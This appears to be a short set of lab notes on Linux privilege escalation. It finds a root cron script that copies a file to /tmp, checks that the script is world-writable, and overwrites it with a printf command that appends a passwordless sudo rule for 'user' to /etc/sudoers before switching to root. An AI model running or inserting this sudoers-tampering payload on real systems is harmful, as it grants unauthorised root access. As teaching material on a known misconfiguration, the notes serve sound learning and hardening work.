- Linux implements task scheduling through a utility called Cron.
- The crontab file is a configuration file that is used by the Cron utility to store and track Cron jobs that have been created.
- Cron jobs that have been configured to ***run as root user will provide us with root access***.

**Note: Not exactly a typical cron job attack. However, a slightly different**

There's a message file in a home directory that is owned by the root.
```
ls -l
```

Find if the file exists anywhere else on the system
```
find / -name message
```

A file with the same name is present in the `/tmp` directory, that run every minute.
```
ls -l /tmp/
```

This means there is some script/binary which is copying this file to /tmp directory. Locate the source destination of the script in every directory manually (i.e. /, /etc, /opt).
```
grep -nri '/tmp/message' /usr
```

Check the permission of the script, once found.
```
ls -l /usr/local/share/script.sh
```

If the script file is writeable by the normal user, edit the file. If no text editors are present
```
printf '#!/bin/bash\necho "user ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/script.sh
```

Switch to the root user
```
sudo su
```
